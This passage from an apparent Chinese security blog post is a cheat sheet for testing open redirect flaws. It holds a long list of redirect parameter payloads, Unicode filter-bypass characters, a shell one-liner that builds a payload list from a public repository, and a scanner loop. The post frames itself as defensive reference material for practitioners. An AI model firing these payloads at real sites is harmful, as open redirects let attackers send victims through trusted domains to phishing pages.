class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">action=https://weiyigeek.github.io</span><br><span class=\"line\">action_url=https://weiyigeek.github.io</span><br><span class=\"line\">allinurl:https://weiyigeek.github.io</span><br><span class=\"line\">backurl=https://weiyigeek.github.io</span><br><span class=\"line\">burl=https://weiyigeek.github.io</span><br><span class=\"line\">callback_url=https://weiyigeek.github.io</span><br><span class=\"line\">/cgi-bin/redirect.cgi?https://weiyigeek.github.io</span><br><span class=\"line\">checkout_url=https://weiyigeek.github.io</span><br><span class=\"line\">click?u=https://weiyigeek.github.io</span><br><span class=\"line\">clickurl=https://weiyigeek.github.io</span><br><span class=\"line\"><span class=\"built_in\">continue</span>=https://weiyigeek.github.io</span><br><span class=\"line\">data=https://weiyigeek.github.io</span><br><span class=\"line\">dest=https://weiyigeek.github.io</span><br><span class=\"line\">destination=https://weiyigeek.github.io</span><br><span class=\"line\">desturl=https://weiyigeek.github.io</span><br><span class=\"line\">ext=https://weiyigeek.github.io</span><br><span class=\"line\">forward=https://weiyigeek.github.io</span><br><span class=\"line\">forward_url=https://weiyigeek.github.io</span><br><span class=\"line\">go=https://weiyigeek.github.io</span><br><span class=\"line\">goto=https://weiyigeek.github.io</span><br><span class=\"line\">/https://weiyigeek.github.io</span><br><span class=\"line\">@https://weiyigeek.github.io</span><br><span class=\"line\">image_url=https://weiyigeek.github.io</span><br><span class=\"line\">jump=https://weiyigeek.github.io</span><br><span class=\"line\">jump_url=https://weiyigeek.github.io</span><br><span class=\"line\">j?url=https://weiyigeek.github.io</span><br><span class=\"line\">linkAddress=https://weiyigeek.github.io</span><br><span class=\"line\">link=https://weiyigeek.github.io</span><br><span class=\"line\">location=https://weiyigeek.github.io</span><br><span class=\"line\">login=https://weiyigeek.github.io</span><br><span class=\"line\">/login?to=https://weiyigeek.github.io</span><br><span class=\"line\"><span class=\"built_in\">logout</span>=https://weiyigeek.github.io</span><br><span class=\"line\">next=https://weiyigeek.github.io</span><br><span class=\"line\">origin=https://weiyigeek.github.io</span><br><span class=\"line\">originUrl=https://weiyigeek.github.io</span><br><span class=\"line\">/out?https://weiyigeek.github.io</span><br><span class=\"line\">/out/https://weiyigeek.github.io</span><br><span class=\"line\">page=https://weiyigeek.github.io</span><br><span class=\"line\">pic=https://weiyigeek.github.io</span><br><span class=\"line\">q=https://weiyigeek.github.io</span><br><span class=\"line\">qurl=https://weiyigeek.github.io</span><br><span class=\"line\">recurl=https://weiyigeek.github.io</span><br><span class=\"line\">/redirect/https://weiyigeek.github.io</span><br><span class=\"line\">redirect=https://weiyigeek.github.io</span><br><span class=\"line\">Redirect=https://weiyigeek.github.io</span><br><span class=\"line\">redirect_uri=https://weiyigeek.github.io</span><br><span class=\"line\">redirect_url=https://weiyigeek.github.io</span><br><span class=\"line\">RedirectUrl=https://weiyigeek.github.io</span><br><span class=\"line\">redir=https://weiyigeek.github.io</span><br><span class=\"line\">request=https://weiyigeek.github.io</span><br><span class=\"line\"><span class=\"built_in\">return</span>=https://weiyigeek.github.io</span><br><span class=\"line\">return_path=https://weiyigeek.github.io</span><br><span class=\"line\">return_to=https://weiyigeek.github.io</span><br><span class=\"line\">returnTo=https://weiyigeek.github.io</span><br><span class=\"line\">ReturnUrl=https://weiyigeek.github.io</span><br><span class=\"line\">rit_url=https://weiyigeek.github.io</span><br><span class=\"line\">rurl=https://weiyigeek.github.io</span><br><span class=\"line\">service=https://weiyigeek.github.io</span><br><span class=\"line\">sp_url=https://weiyigeek.github.io</span><br><span class=\"line\">src=https://weiyigeek.github.io</span><br><span class=\"line\">success=https://weiyigeek.github.io</span><br><span class=\"line\">target=https://weiyigeek.github.io</span><br><span class=\"line\">tc?src=https://weiyigeek.github.io</span><br><span class=\"line\">u1=https://weiyigeek.github.io</span><br><span class=\"line\">u=https://weiyigeek.github.io</span><br><span class=\"line\">uri=https://weiyigeek.github.io</span><br><span class=\"line\">url=//https://weiyigeek.github.io</span><br><span class=\"line\">url=https://weiyigeek.github.io</span><br><span class=\"line\">Url=https://weiyigeek.github.io</span><br><span class=\"line\">view=https://weiyigeek.github.io</span><br></pre></td></tr></table></figure><br>补充：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Struct2重定向漏洞</span></span><br><span class=\"line\">redirect:https://weiyigeek.github.io</span><br></pre></td></tr></table></figure><br><br></p>\n<ul>\n<li>基础元字符字典Bypass-Payload:<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List:</span><br><span class=\"line\">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class=\"line\">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class=\"line\">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class=\"line\">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class=\"line\">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class=\"line\">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class=\"line\">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br><span class=\"line\">- ~ ? %</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<p><strong>2)URL_Redirect byPass</strong></p>\n<ul>\n<li>Payload参考:<a href=\"https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt\" target=\"_blank\" rel=\"noopener\">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WHITELISTEDDOMAIN=<span class=\"string\">\"www.test.com\"</span> &amp;&amp; sed <span class=\"string\">'s/www.whitelisteddomain.tld/'</span><span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span><span class=\"string\">'/'</span> Open-Redirect-payloads.txt &gt; Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.tmp &amp;&amp; sed <span class=\"string\">'s/@www.whitelisteddomain.tld/@'</span><span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span><span class=\"string\">'/'</span> Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.tmp &gt; Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.txt &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span> | awk -F. <span class=\"string\">'&#123;if ($1 ==\"www\") print \"//not\"$2\".\"$NF\"/\"; else print \"//not\"$1\".\"$NF\"/\";&#125;'</span> &gt;&gt; Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.txt &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span> | awk -F. <span class=\"string\">'&#123;if ($1 ==\"www\") print \"http://not\"$2\".\"$NF\"/\"; else print \"http://not\"$1\".\"$NF\"/\";&#125;'</span> &gt;&gt; Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.txt &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span> | awk -F. <span class=\"string\">'&#123;print \"http://\"$0\".\"$NF\"/\"&#125;'</span> &gt;&gt; Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.txt &amp;&amp; rm -f Open-Redirect-payloads-burp-<span class=\"string\">\"<span class=\"variable\">$WHITELISTEDDOMAIN</span>\"</span>.tmp &amp;&amp; <span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\nDone. Filename: <span class=\"variable\">$(pwd)</span>/Open-Redirect-payloads-burp-\"</span><span class=\"variable\">$WHITELISTEDDOMAIN</span><span class=\"string\">\".txt\"</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190926151407.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<ul>\n<li>工具的使用:<a href=\"https://github.com/ak1t4/open-redirect-scanner\" target=\"_blank\" rel=\"noopener\">https://github.com/ak1t4/open-redirect-scanner</a><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">read</span> -r line; <span class=\"keyword\">do</span> python redirect.py uber.list <span class=\"variable\">$line</span>;<span class=\"keyword\">done</span> &lt; UrlRedirect-ByPass.txt</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<p><strong>3) 参考网站</strong></p>\n<ul>\n<li>思路:<a href=\"https://c1h2e1.github.io/\" target=\"_blank\" rel=\"noopener\">https://c1h2e1.github.io/</a></li>\n<li>思路:<a href=\"https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html\" target=\"_blank\" rel=\"noopener\">https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"前端漏洞","path":"api/categories/前端漏洞.json"}],"tags":[{"name":"Redirect","path":"api/tags/Redirect.json"}]}